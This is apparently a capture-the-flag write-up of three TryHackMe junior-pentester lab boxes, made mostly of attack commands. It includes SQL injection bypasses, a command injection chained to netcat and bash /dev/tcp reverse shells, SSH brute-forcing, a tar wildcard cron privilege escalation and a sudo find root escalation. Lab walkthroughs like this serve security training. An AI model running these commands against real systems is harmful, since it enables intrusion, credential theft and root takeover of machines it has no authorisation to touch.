---
title: "TryHackme Jr.Pentester Capstone Challenges"
date: 2026-04-04 00:00:00 +0800
categories: [Series]
tags: [Series]
platform: Series
author: 0xmr
image: /assets/img/posts/capstone.webp
excerpt: "Tryhackme Hacking Boxes..."
---

## Tryhackme Jr.Pentester Challenges

# Operation Promotion
```bash
export IP=Target_IP
[Scanning]
fscan -h $IP -p 1-65535 ALL  ==> 22,80,139,445 Ports Open here
nxc smb $IP
nxc smb $IP --generate-hosts /etc/hosts 
nxc smb $IP --shares   # We have Access to public share, but nothing intersting here.

[Web Exploitation]
whatweb $URL -a 3
katana -u $URL -known-files all -jsluice -js-crawl -o Crawler-katana.txt
dirsearch -r -t 50  --deep-recursive --max-recursion-depth=3 -x 400,404  -u $URL
feroxbuster --url $URL -x php,txt,html,js,json,bak,config,sh,pl,cgi  -t 50 -e

## Internal Login Portal
#### SQL Injections
admin' OR 1=1--
admin'--
admin' --

#### IDOR in user id Paramemter /admin/users/lookup.php?id=FUZZ
#### FUZZ using ffuf, found id=7 [Description:-] /admin/sysmaint-checks/ping.php

[Initial Access]
#### Parameter identification, it return ?host=<Target_IP>
curl -s http://$IP/admin/sysmaint-checks/ping.php?host=192.168.195.14 # It actually ping the box.

#### Command Injection
curl -s http://$IP/admin/sysmaint-checks/ping.php?host=192.168.195.14;id
curl -s http://$IP/admin/sysmaint-checks/ping.php?host=192.168.195.14;which busybox nc

##### Reverse shell
curl -s http://$IP/admin/sysmaint-checks/ping.php?host=192.168.195.14;/usr/bin/busybox nc 192.168.x.x 9001 -e sh


[Post Exploitation]
##### Config file
cat /var/www/html/config/db.conf
==> jford and There hash

##### Cracking Hash
It's seems that hash is not craclable.

##### User Enumeration
cat /etc/passwd | grep -i 'sh$'
==> root,jford,ubuntu

##### Creating Wordlists for Brute force
echo "spring2025" base2025.txt
hashcat --stdout base2025.txt -r /usr/share/hashcat/rules/dive.rule > wordlist2025.txt
echo "spring2026" base2026.txt
hashcat --stdout base2026.txt -r /usr/share/hashcat/rules/dive.rule > wordlist2026.txt


##### Brute force Password
hydra -l jford -P wordlist2026.txt $IP ssh    <=== Found Password [xxxxxxxxx]
hydra -l jford -P wordlist2025.txt $IP ssh 

[SSH Login]
nxc ssh $IP -u 'jford' -p 'xxxxxxxxx'

[Root Exploitation]
sudo -l
=>  (root) NOPASSWD: /usr/bin/find

[GTFOBins Cheatsheet]
sudo find . -exec /bin/sh -p \; -quit
```

# Operation Coldstart
```bash
export IP=Target_IP
[Scanning]
fscan -h $IP -p 1-65535 ALL  ==> 21,22,80 Open here

[Web Exploitation]
whatweb $URL -a 3
katana -u $URL -known-files all -jsluice -js-crawl -o Crawler-katana.txt
dirsearch -r -t 50  --deep-recursive --max-recursion-depth=3 -x 400,404  -u $URL
feroxbuster --url $URL -x php,txt,html,js,json,bak,config,sh,pl,cgi  -t 50 -e

[FTP Enum]
nxc ftp $IP -u 'Anonymous' -p 'Anonymous'
nxc ftp $IP -u 'Anonymous' -p 'Anonymous' --ls
nxc ftp $IP -u 'Anonymous' -p 'Anonymous' --get backup.tar.gz

[Source Code Review]
tar xvf backup.tar.gz
##### Manually Found !
Host:- kestrel.thm
Path:- /admin  or /admin/notes

##### Automation Found !
opengrep scan --config auto .    # scan backup-source-code
Attack:- SSRF

[Initial Exploitaion]
##### SSRF
http://kestrel.thm         # It actually Return the Whole Page
http://kestrel.thm/admin   # Return [volt lab admin endpoint]
http://kestrel.thm/admin/notes # It return the creds
user:- webdev
pass:- xxxxxxxx

[SSH Login]
nxc ssh $IP -u 'webdev' -p 'xxxxxxx'
ssh webdev@$IP ---> Successfully Login it!

[Post Exploitation]
# DETECTION
cat /etc/cron.d/Cron_Name_Here
# * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
#                                                                    ^
#                                                runs as root + wildcard in writable directory

# EXPLOITATION
cd /opt/backups
# payload: creates SUID bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh         
touch -- '--checkpoint=1'                        # creates a file named --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'  # creates a file named --checkpoint-action=exec=sh shell.sh

# Wait for cron to run, then:
/tmp/bash -p        # -p preserves root effective UID

# BEHIND THE SCENES
# Shell expands * into all filenames before tar runs, so tar sees:
tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh
#                                 ↑ these are actually filenames, but tar treats them as real flags
#                                   --checkpoint-action tells tar to execute shell.sh as root
```

# Dead Drop
```bash
[Web Server Exploitation]
export IP=Target_IP
#### Scanning
fscan -h $IP -p 1-65535 ALL  ==> 22,80 Open here

#### Web Server
[SQL Injection Bypass]
admin'--
admin' AND 1=1--
==> [SQL Injection Database Extraction]
back-end DBMS: SQLite
Tables:- sqlite_sequence,users
sqlmap -r req.txt --batch --risk=3 --level=5 --dbs -T users --dump
{Extracted Database Credentials}:-
svc-backup:xxxxxx
admin:xxxxxxx

==> [Reverse shell]
{pwn.js}:-
require('child_process').exec(
'bash -c "bash -i >& /dev/tcp/192.168.x.x/9001 0>&1"'
)

==> [Credential Hunting on Web server and Cracking Hash]
{shadow.bak} file found! NTLMV2-Hash
john shadow.bak /usr/share/wordlists/rockyou.txt
svc-drop:xxxxxxxxxxxx

==> [SSH Login]
svc-drop:xxxxxxxxxxxx

==> [APK Compilation]
/home/svc-drop/backup/deaddrop-mobile.apk  --> Compile it using {jadx-gui  Application}

{Global search} :- Control + shift + F ==> Type (username,password)
Found Creds j.harris:xxxxxxxxxxxxx2026!
```

> updating...
